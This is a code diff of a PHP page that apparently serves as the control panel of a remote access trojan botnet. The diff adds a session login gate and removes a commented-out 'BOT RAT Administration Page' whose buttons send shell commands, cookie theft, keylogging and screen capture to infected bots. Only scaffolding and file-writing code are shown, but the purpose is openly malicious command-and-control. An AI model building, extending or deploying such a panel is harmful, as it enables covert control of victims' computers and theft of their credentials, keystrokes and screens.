@@ -1,4 +1,7 @@
 <?php
+session_start();
+$header_display="Control Bot";
+if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
 $ID = "All";
 $ip = "All";
 $port = "All";
@@ -40,52 +43,6 @@ fwrite($fp, '&');
 fwrite($fp, $port);
 fclose($fp);
 ?>
-
-<!-- <!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Open Bot</title>
-    <style>
-        body {
-            font-family: Arial, Helvetica, sans-serif;
-            text-align: center;
-            background-color: #87ceeb;
-            padding: 20px;
-
-        }
-
-        button {
-            padding: 10px;
-        }
-    </style>
-</head>
-
-<body>
-    <div id="command-form">
-        <img src="serverIcon.png" alt="" width="180vw">
-        <h2>BOT RAT Administration Page</h2>
-        <form method="post" action="openBot.php?ID=" id="cmdform">
-            RAT BOT IP: <input type="text" name="ip" readonly value="" />
-           
-            <br><br>
-            RAT BOT PORT: <input type="text" name="port" readonly value="" />
-            <p>Please enter your command: </p>
-            <input type="text" name="cmdstr" size="35%">
-            <p><input type="submit" name="buttonCmd" value="Execute Cmd"></p>
-            <p><input type="submit" name="buttonCookie" value="Execute Cookie"></p>
-            <p><input type="submit" name="buttonKeylogger" value="Execute Keylogger"></p>
-            <p><input type="submit" name="buttonCapture" value="Execute Capture"></p>
-            <p><a href='index.php'>Back to Main</a></p>
-        </form>
-    </div>
-</body>
-
-</html> -->
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -424,4 +381,11 @@ if (isset($_POST['buttonCmd'])) {
     fwrite($fp, "aaaa");
     fclose($fp);
 }
+}
+else
+{
+    include_once('noLogin.php');
+}
+
+
 ?>
